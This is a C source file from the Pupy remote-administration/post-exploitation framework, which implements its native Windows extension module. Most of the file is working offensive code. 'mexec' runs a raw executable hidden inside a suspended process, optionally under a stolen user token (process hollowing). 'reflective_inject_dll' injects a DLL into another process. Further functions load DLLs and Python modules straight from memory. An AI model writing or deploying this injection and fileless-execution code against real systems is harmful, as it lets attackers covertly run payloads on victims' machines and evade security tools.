/*
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
*/

#include <windows.h>

#ifdef _PUPY_DYNLOAD
#include <Python.h>
#include "pupy_pyd.h"
#else
#include "Python-dynload.h"
#include "pupy_load.h"
#endif

#include "debug.h"
#include "MyLoadLibrary.h"
#include "base_inject.h"
#include "in-mem-exe.c"

static char module_doc[] = DOC("Builtins utilities for pupy");

#ifndef UINTPTR
 #ifndef _WIN32
   typedef DWORD UINTPTR;
 #else
   typedef ULONGLONG UINTPTR;
 #endif
#endif

static PyObject *ExecError;

#include "revision.h"

static HINSTANCE hAppInstance = NULL;
static PyObject *Py_on_exit_session_callback = NULL;
static int is_shared = 0;

void on_exit_session(void) {
    PyGILState_STATE gstate;
    PyObject * pResult;

    dprint(
        "pupy:on_exit_session called, current callback: %p\n",
        Py_on_exit_session_callback);

    if (!Py_on_exit_session_callback)
        return;

    gstate = PyGILState_Ensure();
    pResult = PyObject_CallObject(Py_on_exit_session_callback, NULL);
    PyGILState_Release(gstate);
}

static PyObject *Py_set_exit_session_callback(PyObject *self, PyObject *args)
{
        PyObject *old = Py_on_exit_session_callback;

        if (!PyArg_ParseTuple(args, "O", &Py_on_exit_session_callback))
                return NULL;

        Py_XINCREF(Py_on_exit_session_callback);
        Py_XDECREF(old);

        return PyBool_FromLong(1);
}

static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
#ifdef _WIN64
        return Py_BuildValue("s", "x64");
#else
        return Py_BuildValue("s", "x86");
#endif
}

static PyObject *Py_mexec(PyObject *self, PyObject *args) {
        PROCESS_INFORMATION pi;
        STARTUPINFOW si;

        SECURITY_ATTRIBUTES saAttr = {
                sizeof(SECURITY_ATTRIBUTES),
                NULL,
                TRUE
        };

        HANDLE g_hChildStd_IN_Rd = NULL;
        HANDLE g_hChildStd_IN_Wr = NULL;
        HANDLE g_hChildStd_OUT_Rd = NULL;
        HANDLE g_hChildStd_OUT_Wr = NULL;
        BOOL inherit = FALSE;
        PyObject* py_redirect_stdio = NULL;
        PyObject* py_hidden = NULL;
        DWORD createFlags = CREATE_SUSPENDED|CREATE_NEW_CONSOLE;
        PyObject* py_cmdline = NULL;
        char *pe_raw_bytes;
        int pe_raw_bytes_len;

#ifdef _WIN64
        long long dupHandleAddressPLL = 0;
        void **dupHandleAddress = NULL;
        HANDLE dupHandle = NULL;

        if (!PyArg_ParseTuple(
                        args,
                        "Os#|OOK",
                        &py_cmdline, &pe_raw_bytes, &pe_raw_bytes_len,
                        &py_redirect_stdio, &py_hidden, &dupHandleAddressPLL))
                // the address of the handle is directly passed with ctypes
                return NULL;

        dupHandleAddress = (void **) ((DWORD_PTR) dupHandleAddressPLL);
#else
        PVOID dupHandleAddress = NULL;
        HANDLE dupHandle = NULL;

        if (!PyArg_ParseTuple(
                        args,
                        "Os#|OOI",
                        &py_cmdline, &pe_raw_bytes, &pe_raw_bytes_len,
                        &py_redirect_stdio, &py_hidden, &dupHandleAddress))
                // the address of the handle is directly passed with ctypes
                return NULL;
#endif

        dprint(
            "Py_mexec::passed payload (%p size=%lu)\n",
            pe_raw_bytes, pe_raw_bytes_len
        );

        if (!PyUnicode_Check(py_cmdline)) {
            return PyErr_Format(
                PyExc_Exception, "cmdline must me unicode object"
            );
        }

        memset(&si, 0, sizeof(STARTUPINFOW));
        si.cb = sizeof(STARTUPINFOW);

        memset(&pi, 0, sizeof(PROCESS_INFORMATION));

        if(py_hidden && PyObject_IsTrue(py_hidden)){
                si.dwFlags |= STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                createFlags |= CREATE_NO_WINDOW;
        }

        if (!py_redirect_stdio || PyObject_IsTrue(py_redirect_stdio)) {
            dprint("Py_mexec::passed redirect stdio required\n");

            if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
                return PyErr_Format(
                    PyExc_Exception, "Error in CreatePipe (IN): Errno %d", GetLastError());
            }

            if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
                CloseHandle(g_hChildStd_IN_Rd);
                CloseHandle(g_hChildStd_IN_Wr);
                return PyErr_Format(
                    PyExc_Exception, "Error in CreatePipe (OUT): Errno %d", GetLastError());
            }

            si.hStdInput  = g_hChildStd_IN_Rd;
            si.hStdOutput = g_hChildStd_OUT_Wr;
            si.hStdError  = g_hChildStd_OUT_Wr;
            si.dwFlags   |= STARTF_USESTDHANDLES;

            inherit = TRUE;
        }

        if (!dupHandleAddress) {
            BOOL blCreated;

            size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
            size_t size = wsize * sizeof(wchar_t);

            wchar_t *tmpstr = malloc(size);
            RtlZeroMemory(tmpstr, size);

            dprint("Py_mexec::unicode cmdline, size=%d\n", wsize);

            PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);
            blCreated = CreateProcessW(
                NULL, tmpstr,
                &saAttr, NULL, inherit,
                createFlags, NULL, NULL, &si, &pi
            );

            free(tmpstr);

            if(!blCreated) {
                DWORD dwLastError = GetLastError();

                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

                return PyErr_Format(
                    PyExc_Exception, "Error in CreateProcess: Errno %d", dwLastError
                );
            }

        } else {
            BOOL blCreated;

            size_t wsize = PyUnicode_GetSize(py_cmdline) + 1;
            size_t size = wsize * sizeof(wchar_t);

            wchar_t *tmpstr = malloc(size);

            RtlZeroMemory(tmpstr, size);

            PyUnicode_AsWideChar(py_cmdline, tmpstr, wsize);

            dupHandle = (HANDLE) dupHandleAddress;

            blCreated = CreateProcessAsUserW(
                dupHandle, NULL, tmpstr, &saAttr,
                NULL, inherit, createFlags, NULL, NULL, &si, &pi
            );

            free(tmpstr);

            if (!blCreated) {
                DWORD dwLastError = GetLastError();

                CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
                CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

                return PyErr_Format(
                    PyExc_Exception, "Error in CreateProcess: Errno %d dupHandle %x",
                    dwLastError, dupHandle
                );
            }
        }

        CloseHandle(g_hChildStd_IN_Rd);
        CloseHandle(g_hChildStd_OUT_Wr);

        dprint("Py_mexec::Push to container\n");

        if (!MapNewExecutableRegionInProcess(pi.hProcess, pi.hThread, pe_raw_bytes)) {
            DWORD dwErrno = GetLastError();

            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
            CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

            return PyErr_Format(
                PyExc_Exception,
                "Error in MapNewExecutableRegionInProcess: Errno %d",
                dwErrno
            );
        }

        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess);
            CloseHandle(g_hChildStd_IN_Rd); CloseHandle(g_hChildStd_IN_Wr);
            CloseHandle(g_hChildStd_OUT_Rd); CloseHandle(g_hChildStd_OUT_Wr);

            return PyErr_Format(
                PyExc_Exception,
                "Error in ResumeThread: Errno %d", GetLastError()
            );
        }

        CloseHandle(pi.hThread);

        return Py_BuildValue("(III)", pi.hProcess, g_hChildStd_IN_Wr, g_hChildStd_OUT_Rd);
}


static PyObject *Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;
        const char *cpCommandLine;
        PyObject* py_is64bit;
        int is64bits;

        if (!PyArg_ParseTuple(
                args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
            return NULL;

        is64bits = PyObject_IsTrue(py_is64bit);

        if(is64bits)
            is64bits = PROCESS_ARCH_X64;
        else
            is64bits = PROCESS_ARCH_X86;

        if(inject_dll(
               dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
            return NULL;

        return PyBool_FromLong(1);
}


static PyObject *Py_load_dll(PyObject *self, PyObject *args)
{
        DWORD dwPid;
        const char *lpDllBuffer;
        DWORD dwDllLenght;

        const char *dllname;
        if (!PyArg_ParseTuple(args, "ss#", &dllname, &lpDllBuffer, &dwDllLenght))
                return NULL;

        return PyLong_FromVoidPtr(MyLoadLibrary(dllname, lpDllBuffer, NULL));
}


static PyObject *Py_find_function_address(PyObject *self, PyObject *args)
{
        const char *lpDllName = NULL;
        const char *lpFuncName = NULL;
        void *address = NULL;

        if (PyArg_ParseTuple(args, "ss", &lpDllName, &lpFuncName)) {
                address = MyFindProcAddress(lpDllName, lpFuncName);
        }

        return PyLong_FromVoidPtr(address);
}


static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
{
        return PyBool_FromLong(is_shared);
}


static PyObject *Py_set_is_shared_object(PyObject *self, PyObject *arg0)
{
        if (!is_shared && PyObject_IsTrue(arg0))
                is_shared = 1;

        return PyBool_FromLong(is_shared);
}


static PyObject *
import_module(PyObject *self, PyObject *args)
{
        PyObject *spec;
        char *data;
        int size;
        char *initfuncname;
        char *modname;
        char *pathname;
        //HMEMORYMODULE hmem;
        HMODULE hmem;
        FARPROC do_init;

        ULONG_PTR cookie = 0;
        char *oldcontext;

        /* code, initfuncname, fqmodulename, path */
        if (!PyArg_ParseTuple(args, "s#Osss:import_module",
                              &data, &size,
                              &spec,
                              &initfuncname, &modname, &pathname))
                return NULL;

        dprint(
                "import_module(name=%s size=%d ptr=%p)\n",
                pathname, size, data);

        //try some windows manifest magic...
        cookie = _My_ActivateActCtx();
        hmem = MyLoadLibrary(pathname, data, NULL);
        _My_DeactivateActCtx(cookie);

        if (!hmem) {
                PyErr_Format(PyExc_ImportError,
                             "MemoryLoadLibrary failed loading %s (err=%d)",
                                 pathname, GetLastError());
                return NULL;
        }

        do_init = MyGetProcAddress(hmem, initfuncname);
        if (!do_init) {
                MyFreeLibrary(hmem);
                PyErr_Format(PyExc_ImportError,
                             "Could not find function %s", initfuncname);
                return NULL;
        }

        return PyInit_Module(spec, modname, do_init);
}


static PyMethodDef methods[] = {
        {
            "is_shared", Py_is_shared_object,
            METH_NOARGS, DOC("Client is shared object")
        }, {
            "_set_shared", Py_set_is_shared_object,
            METH_NOARGS, DOC("")
        }, {
            "get_arch", Py_get_arch, METH_NOARGS,
            DOC("get current pupy architecture (x86 or x64)")
        }, {
            "reflective_inject_dll", Py_reflective_inject_dll,
            METH_VARARGS|METH_KEYWORDS,
            DOC(
                "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\n"
                "reflectively inject a dll into a process. raise an Exception on failure"
            )
        }, {
            "mexec", Py_mexec, METH_VARARGS|METH_KEYWORDS,
            DOC("mexec(cmdline, raw_pe, redirected_stdio=True, hidden=True)")
        }, {
            "import_module", import_module, METH_VARARGS,
            "import_module(data, size, initfuncname, path) -> module"
        }, {
            "load_dll", Py_load_dll, METH_VARARGS,
            DOC("load_dll(dllname, raw_dll) -> ptr")
        }, {
            "set_exit_session_callback", Py_set_exit_session_callback,
            METH_VARARGS, DOC("set_exit_session_callback(function)")
        }, {
            "find_function_address", Py_find_function_address, METH_VARARGS,
            DOC("find_function_address(dllname, function) -> address")
        }, {
             /* Sentinel */
            NULL, NULL
        }
};


#if PYMAJ > 2
static struct PyModuleDef pupy_moduledef = {
    PyModuleDef_HEAD_INIT,
    "_pupy", module_doc, -1, methods,
    NULL, NULL, NULL, NULL,
};
#endif


#if PYMAJ > 2
PyObject* PyInit__pupy()
#else
void init_pupy(void)
#endif
{
    PyObject *pupy = NULL;

#if PYMAJ > 2
    pupy = PyModule_Create(&pupy_moduledef);
#else
    pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
#endif

    if (!pupy) {
#if PYMAJ > 2
        return NULL;
#else
        return;
#endif
    }

    PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
    ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
    Py_INCREF(ExecError);
    PyModule_AddObject(pupy, "error", ExecError);

#if PYMAJ > 2
    return pupy;
#endif
}

#ifdef _PUPY_DYNLOAD
// Compatibility code
#include "Python-dynload-compat.c"

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    DWORD threadId;
    BOOL bReturnValue = TRUE;

    dprint("Call DllMain (_pupy) %d/%p\n", dwReason, lpReserved);

    switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *(HMODULE *)lpReserved = hAppInstance;
        break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            if (lpReserved > 0xFFFF) {
                _pupy_pyd_args_t *args =
                        (_pupy_pyd_args_t*) lpReserved;

                if (args->pvMemoryLibraries) {
                        MySetLibraries(args->pvMemoryLibraries);
                }

                args->cbExit = on_exit_session;
                args->blInitialized = TRUE;
#if PYMAJ > 2
                args->pInit = PyInit__pupy;
#else
                args->pInit = init_pupy;
#endif
            }
            return TRUE;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            dprint("Should not happen?\n");
            return FALSE;
    }

    dprint("Call DllMain - completed\n");
    return bReturnValue;
}
#endif
